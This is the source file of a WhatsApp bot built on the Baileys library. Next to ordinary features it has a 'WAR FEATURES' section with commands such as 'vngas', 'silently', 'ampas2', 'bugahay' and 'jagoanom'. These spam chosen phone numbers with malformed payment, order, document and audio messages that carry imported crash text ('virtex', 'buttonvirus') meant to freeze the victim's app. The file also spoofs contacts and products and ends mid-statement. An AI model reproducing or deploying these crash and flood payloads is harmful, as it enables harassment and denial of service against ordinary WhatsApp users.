require('./settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const fetch = require('node-fetch')
const os = require('os')
const maker = require('mumaker')
const hx = require("hxz-api")
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')
const xeonkey = require('xfarr-api')
const cheerio = require ("cheerio")
let { msgFilter } = require('./lib/antispam')
let { covid } = require('./lib/covid.js') 
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const { color, bgcolor } = require('./lib/color')
const xeontod = require("tod-api")

//Database other\\
let kontolodon = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/kontol.json'));
let kontlopodon = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/kontol2.json'));
let xeonysticker = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/sticker.json'));
let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/audio.json'));
let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
const _autostick = JSON.parse(fs.readFileSync('./database/autostickpc.json'));
let banUser = JSON.parse(fs.readFileSync('./database/banUser.json'));
let banchat = JSON.parse(fs.readFileSync('./database/banChat.json'));
let bad = JSON.parse(fs.readFileSync('./src/toxic/bad.json'))
xeonbugpic = fs.readFileSync('./XBug/xpic.jpeg')
const { xeonbut2 } = require('./XBug/xeonbut2.js')
const { xeonvirtex } = require('./XBug/xeonvirtex.js')
const { xeonbutton } = require('./XBug/xeonbutton.js')
const { xeonbrutal } = require('./XBug/xeonbrutal.js')
const audionye = fs.readFileSync('./y.mp3')
const { ngazap } = require('./lib/ngazap.js')
const { santedpc } = require('./lib/santedpc.js')
const { buttonvirus2 } = require('./lib/buttonvirus2.js')
const { buttonvirus } = require('./lib/buttonvirus.js')
const { virus } = require('./lib/virus.js')
const { buttonkal } = require('./lib/buttonkal.js')

//read database\\

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
        const isCreator = [botNumber, ...global.premium, ...global.rkyt, ...['6285842965801'], ...['6285774939323'], ...['6285732604538'], ...['6285747219408']].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
	    const isMedia = /image|video|sticker|audio/.test(mime)
	    const from = mek.key.remoteJid
	    const type = Object.keys(mek.message)[0]        
	    const content = JSON.stringify(mek.message)
	    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()

        //group\\
        const groupMetadata = m.isGroup ? await XeonBotInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
        const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	
const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
const AntiNsfw2 = m.isGroup ? ntnsfw2.includes(from) : false
const WallDua = m.isGroup ? walldua.includes(from) : false
const isAutoStick = _autostick.includes(from)
const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
const Autoreply = m.isGroup ? autorep.includes(from) : true
        const isBan = banUser.includes(m.sender)
        const isBanChat = m.isGroup ? banchat.includes(from) : false
autoreadsw = true
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
 "orderMessage": {
"orderId": orid, // Change ID
"thumbnail": img, // Change the Image
"itemCount": itcount, // Change the Item Count
"status": "INQUIRY", // Don't Replace
"surface": "CATALOG", // Don't Replace
"orderTitle": title, // Change the title
"message": text, // Change Message
"sellerJid": sellers, // Change the seller
"token": tokens, // Change the token
"totalAmount1000": ammount, // Change the Total Amount
"totalCurrencyCode": "IDR", // Up to you
}
}), { userJid: jid })
XeonBotInc.relayMessage(jid, order.message, { messageId: order.key.id})
}
	    
        //member\\
        let picaks = [flaming,fluming,flarun,flasmurf]
		let picak = picaks[Math.floor(Math.random() * picaks.length)]
		
          try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
if (!('templateImage' in setting)) setting.templateImage = false
if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateDocument' in setting)) setting.templateDocument = true
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: false,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateDocument: true,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	
	// FAKE ANJ
	                    
	
	// FAKE TEXT IMG
const textImg = (teks) => {
XeonBotInc.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./XeonMedia/image/wpmobile.png')}) 
}

//FAKE CONTACT
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `916909137213 -1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Click to chat\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
//FAKEREPLY PRODUCT
const ftoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": log0 //The picture
},
"title": `${global.ownername}`, 
"description": `${global.botname}`, 
"currencyCode": "USD",
"priceAmount1000": "2000",
"retailerId": `${global.watermark}`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
} 
//FAKEREPLY TROLI
const ftroli = {
key : {
participant : '0@s.whatsapp.net'
},
message: {
orderMessage: {
itemCount : 1,
status: 1,
surface : 1,
message: `${global.ownername}`, //
orderTitle: `${global.botname}`,
thumbnail: log0, //Pic
sellerJid: '0@s.whatsapp.net'

}
}
}
//FAKEREPLY LOCATION
const flokasi = {
key : {
 participant : '0@s.whatsapp.net'
},
message: {
locationMessage: {
name: `${global.location}`,
jpegThumbnail: log0
}
}
}
//FAKEREPLY DOCUMENT
const fdocs = {
key : {
 participant : '0@s.whatsapp.net'
},
message: {
documentMessage: {
title: `${global.botname}`, 
jpegThumbnail: log0
}
}
}
//FAKEREPLY VIDEO
const fvideo = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"videoMessage": { 
"title": `${global.botname}`,
"h": `${global.ownername}`,
'seconds': '30', 
'caption': `${global.watermark}`,
'jpegThumbnail': log0
}
}
}
//FAKEREPLY GROUPINVITE
const fgclink = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "916909137213-1616169743@g.us",
"inviteCode": `${global.ownername}`,
"groupName": `${global.botname}`, 
"caption":`${global.watermark}`, 
'jpegThumbnail': log0
}
}
}
//FAKEREPLY GIF
const fgif = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
 "videoMessage": { 
 "title":`${global.botname}`,
 "h": `${global.ownername}`,
 'seconds': "30", 
 'gifPlayback': 'true', 
 'caption': `${global.watermark}`,
 'jpegThumbnail': log0
}
}
} 
//FAKEREPLY TEXT WITH THUMBNAIL
const ftextt = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"extendedTextMessage": {
 "text":`${global.ownername}`,
"title": `${global.botname}`,
 'jpegThumbnail': log0
}
} 
}
//FAKEREPLY VN
const fvn = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
{ remoteJid: "916909137213-1613049930@g.us" } : {}) 
},
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "9999999999999999",
"ptt": "true"
}
} 
}
	
	//group target \\
const reply = (teks) => {
           XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
        
        const replay = (teks) => {
            XeonBotInc.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
        }
	
        //Public & Self\\
        if (!XeonBotInc.public) {
            if (!m.key.fromMe) return
        }

        //Push Message To Console && Auto Read\\
        if (AntiNsfw2)
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE 2]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	
	//reset limit every 12 hours\\
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Limit Reseted')
        }, {
            scheduled: true,
            timezone: "Asia/Kolkata"
        })
        
        //hitter
        global.hit = {}
if (isCmd) {
data = await fetchJson('https://api.countapi.xyz/hit/CheemsBot/visits')
jumlahcmd = `${data.value}`
dataa = await fetchJson(`https://api.countapi.xyz/hit/CheemsBot${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
jumlahharian = `${dataa.value}`
}
        
	//auto set bio\\
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await XeonBotInc.setStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	
	
//auto read whatsapp status
if (autoreadsw) {
		if (from === 'status@broadcast') {
		XeonBotInc.chatRead(from)
	}
	}
//autoreader gc and pm
if (global.autoreadpmngc) {
if (command) {
await XeonBotInc.sendPresenceUpdate('composing', m.chat)
XeonBotInc.sendReadReceipt(from, m.sender, [m.key.id])}
}
  //autoread gc only
 //////// if (global.autoReadGc) {
 //////////////////////// if (m.isGroup) { XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id]) }
///}
  //auto recording all
    if (global.autoRecord) { if (m.chat) { XeonBotInc.sendPresenceUpdate('recording', m.chat) }
}
//autotyper all
  if (global.autoTyping) { if (m.chat) { XeonBotInc.sendPresenceUpdate('composing', m.chat) }
}
//auto available all
  if (global.available) { if (m.chat) { XeonBotInc.sendPresenceUpdate('available', m.chat) }
  }

        //antispam or auto react
if (m.message && msgFilter.isFiltered(from)) {
console.log(`❌ [SPAM (3)]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return }
        

//antivirtex by xeon

                //auto reply by xeon
				//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
	const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
	
	const vien = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"orderMessage": {
"orderId": "594071395007984",
"thumbnail": thumb,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Kenneth Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Kenneth Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "6285807264974@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
}}}



const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${ownername}â˜£ï¸${xeonbrutal(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}
}

const xezy = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
},
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"externalAdReply": {
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": websitex,
"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
"thumbnail": xeonbugpic,
}}}

const bhosdike = (teks) => {
 XeonBotInc.sendMessage(m.chat, { image: xeonbugpic, caption: botname, contextInfo:{"externalAdReply": {"title": botname,"body": ownername,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: websitex,
thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
thumbnail: xeonbugpic,
}
}}, { quoted:xezy})
}
 
//emoji 
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
})
} catch (e) {
reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

      //Mute Chat\\
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }
        
        //media detect \\
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        
        //Respon Cmd with media\\
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: XeonBotInc.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        XeonBotInc.ev.emit('messages.upsert', msg)
        }
	    
	
        
       //react function
const reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                
                const timestampe = speed();
const latensie = speed() - timestampe
                const menulist = `┌─❖
│「 Hi 👋 」
└┬❖ 「 ${pushname} 」
┌┤✑  How Are You? 😄
│└────────────┈ ⳹
│
└─「 𝘽𝙊?? 𝙄𝙉𝙁𝙊 」       
│𝗦𝗽𝗲𝗲𝗱 : ${latensie.toFixed(4)} miliseconds
│𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
│𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : ${global.botname}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲 : ${global.ownername}
│𝗢𝘄𝗻𝗲𝗿 𝗡𝗼. : ${global.owner}
│𝗛𝗼𝘀?? 𝗡𝗮𝗺𝗲 : ${os.hostname()}
│𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
│𝗧𝗼𝘁𝗮𝗹 ??𝘀𝗲𝗿 : ${Object.keys(global.db.data.users).length}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 : ${jumlahcmd}
│𝗧𝗼𝘁𝗮𝗹 𝗛𝗶𝘁 𝗧𝗼𝗱𝗮𝘆 : ${jumlahharian}
└┬────────────┈ ⳹
   │✑  Please Select
   │✑  The Button Below
   └─────────────┈ ⳹`
   
   //randoming function
function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}
//document randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

// short story
async function cerpen (category) {
    return new Promise((resolve, reject) => {
        let title = category.toLowerCase().replace(/[()*]/g, "")
        let judul = title.replace(/\s/g, "-")
        let page = Math.floor(Math.random() * 5)
        axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
        .then((get) => {
            let $ = cheerio.load(get.data)
            let link = []
            $('article.post').each(function (a, b) {
                link.push($(b).find('a').attr('href'))
            })
            let random = link[Math.floor(Math.random() * link.length)]
            axios.get(random)
            .then((res) => {
                let $$ = cheerio.load(res.data)
                let hasil = {
                    title: $$('#content > article > h1').text(),
                    author: $$('#content > article').text().split('Short Story: ')[1].split('Category: ')[0],
                    kategori: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
                    lolos: $$('#content > article').text().split('Passed moderation on: ')[1].split('\n')[0],
                    cerita: $$('#content > article > p').text()
                }
                resolve(hasil)
            })
        })
    })
}

async function bygbt(text) {
XeonBotInc.sendMessage(nmn, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}

//Sementara
switch(command) {
	case 'kenbug': {
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (AntiNsfw2) return replay('Sudah diaktifkan')
ntnsfw2.push(from)
XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "off") {
if (!AntiNsfw2) return replay('Sudah dinonaktifkan')
let off = ntnsfw2.indexOf(from)
ntnsfw2.splice(off, 1)
XeonBotInc.sendMessage(from, { react: { text: `✅`, key: m.key }})
} else {
  let buttonsntnsfw2 = [
  { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
  { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw2, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
	}
	
if (AntiNsfw2)
switch(command) {
	case 'test3': {
		if (!isCreator) return
		reply(`Ken *nyala*`)
		}
		break
        	case 'bugmenu': case 'buglist': {
        	if (!isPremium && !isCreator) return reply(mess.premi)
        reply(`testing`)
        	}
        break
        	//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
//-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
case 'poll': {
if (!isPremium && !isCreator) return reply(mess.premi)
bwa = q.split('.')[0]
jumlah = q.split('.')[1]
if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
for (let i = 0; i < jumlah; i++) {
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": botname,
"options": [
	{
"optionName": "VOTE FOR PLEASURE"
	},
	{
"optionName": "VOTE AND WIN IPHONE 14 PRO MAX"
	},
	{
"optionName": "VOTE TO GET FREE +84 NUMBER"
	},
	{
"optionName": "VOTE TO GET +54"
	},
	{
"optionName": "VOTE TO GET +64"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: doc })
XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, pollCreation.message, { messageId: pollCreation.key.id })
const deploy = (teks) => {
  XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}
deploy('Successful sendbug')
}
reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)

}
break
case 'thisbug': {
if (!isCreator) return reply(mess.premi)
let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€™âœªâ•â•
 âž² *Message : ${q ? q : 'empty'}*\n\n`
for (let mem of participants) {
teks += `â­” @${mem.id.split('@')[0]}\n`
}
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'vngas': {
if (!isPremium && !isCreator) return reply(mess.premi)
if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
num = q.split('.')[0]
jumlah = q.split('.')[1]
for (let i = 0; i < jumlah; i++) {
XeonBotInc.sendMessage(`${num}@s.whatsapp.net`, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
break
case 'silently': {
if (!isPremium && isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo kontol`
for (let i = 0; i < jumlah; i++) {
yy = fs.readFileSync('./lib/hwmods.HW')
XeonBotInc.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Haikal APIs ~ 404 ${buttonkal}.HW` }, {quoted:doc})
}
}
break
case 'ampas2' : { // delay dikit
if (!isPremium && !isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await XeonBotInc.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(20)
XeonBotInc.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
await sleep(10000)
}
break
case 'bugahay' :
if (!isPremium && !isCreator) return reply(mess.premi)
if (!q) return reply(`Input salah\n(.bugahay <nomor> <titik> <jumlah>)\n\nContoh:\n.bugahay 628584297392.5`)
m.reply(mess.wait)
nom = q.split('.')[0]
jumlah = q.split('.')[1]
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let bugahaybot = [
 {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
  {buttonId: `bugahay`, buttonText: {displayText: xeonbutton}, type: 1},
 ]
let button4Messagess = {
image: {url:waifudd.data.url},
caption:`Kenneth Silently`,
buttons: bugahaybot,
headerType: 1
} 
 await XeonBotInc.sendMessage(`${nom}@s.whatsapp.net`, button4Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
case 'jagoanom' : {
if (!isPremium && !isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku haikal`
for (let i = 0; i < jumlah; i++) {
XeonBotInc.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Anggazyy Silently`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://wa.me/62882021734861`,
